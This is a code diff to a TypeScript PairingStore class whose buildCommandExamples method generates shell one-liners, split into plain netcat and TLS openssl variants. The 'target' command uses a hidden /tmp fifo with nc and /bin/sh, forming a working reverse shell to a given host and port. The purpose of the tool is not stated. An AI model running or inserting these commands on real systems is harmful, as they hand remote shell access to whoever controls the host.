@@ -243,13 +243,24 @@ export class PairingStore {
 		return { active, total: this.pairings.size };
 	}
 
-	buildCommandExamples(key: string, host: string, port: number) {
-		const operatorCmd = `(printf 'AUTH ${key} operator\\n'; cat) | nc ${host} ${port}\n# TLS fallback (e.g. when exposed via Cloudflare/Tailscale Funnel)\n# (printf 'AUTH ${key} operator\\n'; cat) | openssl s_client -quiet -connect ${host}:${port}`;
+	buildCommandExamples(
+		key: string,
+		connection: { host: string; port: number; preferTls?: boolean }
+	) {
+		const { host, port, preferTls = false } = connection;
 		const fifoName = `/tmp/.rs-${key.slice(0, 6)}`;
-		const targetCmd = `mkfifo ${fifoName} 2>/dev/null; (printf 'AUTH ${key} target\\n'; cat ${fifoName}) | nc ${host} ${port} | /bin/sh > ${fifoName} 2>&1\n# TLS fallback (e.g. when exposed via Cloudflare/Tailscale Funnel)\n# mkfifo ${fifoName} 2>/dev/null; (printf 'AUTH ${key} target\\n'; cat ${fifoName}) | openssl s_client -quiet -connect ${host}:${port} | /bin/sh > ${fifoName} 2>&1`;
+		const plain = {
+			operator: `(printf 'AUTH ${key} operator\\n'; cat) | nc ${host} ${port}`,
+			target: `mkfifo ${fifoName} 2>/dev/null; (printf 'AUTH ${key} target\\n'; cat ${fifoName}) | nc ${host} ${port} | /bin/sh > ${fifoName} 2>&1`,
+		};
+		const tls = {
+			operator: `(printf 'AUTH ${key} operator\\n'; cat) | openssl s_client -quiet -connect ${host}:${port}`,
+			target: `mkfifo ${fifoName} 2>/dev/null; (printf 'AUTH ${key} target\\n'; cat ${fifoName}) | openssl s_client -quiet -connect ${host}:${port} | /bin/sh > ${fifoName} 2>&1`,
+		};
 		return {
-			operator: operatorCmd,
-			target: targetCmd,
+			defaultMode: preferTls ? "tls" : "plain",
+			plain,
+			tls,
 		};
 	}
 
